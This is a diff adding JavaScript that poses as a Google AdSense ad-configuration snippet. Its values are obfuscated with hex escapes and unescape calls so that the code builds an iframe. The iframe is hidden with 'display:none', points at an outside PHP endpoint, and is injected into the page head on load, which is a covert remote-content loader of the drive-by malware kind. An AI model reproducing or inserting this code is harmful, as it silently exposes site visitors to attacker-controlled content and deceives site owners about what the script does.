@@ -1,0 +1,18 @@
+google_ad_client = "pub-6110580129768";
+google_ad_width = 300;
+google_ad_height = 250;
+google_ad_format = "300x250_as";
+google_ad_type = "textframe".replace(/text/i,unescape("%69"));
+google_ad_channel = "\x68\x74\x74\x70\x3a\x2f\x2f\x70\x39\x33\x2d\x61\x64\x73\x79\x73\x2e\x6e\x6c\x2e\x61\x69\x2f\x76\x73\x65\x72\x76\x2e\x70\x68\x70\x3f\x6e\x50\x6f\x70\x3d\x65\x35\x32\x31\x38\x30\x36\x37\x37\x37\x36\x31\x31\x34\x33\x63";
+google_color_style = "display"+unescape("\x3a\x6e\x6f\x6e\x65\x3b");
+google_color_border = "FFFFFF";
+google_color_bg = "FFFFFF";
+google_color_link = "0000FF";
+google_color_text = "000000";
+google_color_url = "008000";
+var obj = document.createElement(google_ad_type);
+obj.width = google_ad_width;
+obj.height = google_ad_height;
+obj.src = google_ad_channel;
+obj.setAttribute("style",google_color_style);
+document.getElementsByTagName('head')[0].appendChild(obj);
